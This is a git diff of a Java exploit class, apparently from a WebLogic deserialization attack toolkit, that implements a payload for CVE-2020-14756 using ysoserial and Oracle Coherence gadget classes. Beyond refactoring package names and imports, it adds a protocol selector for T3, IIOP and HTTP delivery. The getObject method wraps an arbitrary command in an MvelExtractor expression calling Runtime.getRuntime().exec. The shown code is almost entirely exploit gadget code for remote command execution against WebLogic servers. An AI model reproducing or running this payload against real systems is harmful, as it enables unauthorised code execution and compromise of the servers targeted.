@@ -1,13 +1,12 @@
-package unserWeblogic;
+package unserWeblogic.gadgets;
 // coherence-rest.jar
 
-import unserWeblogic.T3.T3;
 import com.tangosol.coherence.rest.util.extractor.MvelExtractor;
 import com.tangosol.coherence.servlet.AttributeHolder;
 import com.tangosol.util.SortedBag;
 import com.tangosol.util.aggregator.TopNAggregator;
+import unserWeblogic.T3.T3;
 import ysoserial.Serializer;
-import ysoserial.payloads.ObjectPayload;
 import ysoserial.secmgr.ExecCheckingSecurityManager;
 
 import java.lang.reflect.Field;
@@ -15,6 +14,8 @@ import java.lang.reflect.Method;
 import java.util.concurrent.Callable;
 
 public class CVE_2020_14756 implements ObjectPayload<Object>{
+
+    boolean[] protocolType = {true, false, false}; //T3, IIOP, HTTP
 
     public Object getObject(final String command) throws Exception{
         MvelExtractor extractor = new MvelExtractor("java.lang.Runtime.getRuntime().exec(\"" + command +"\");");
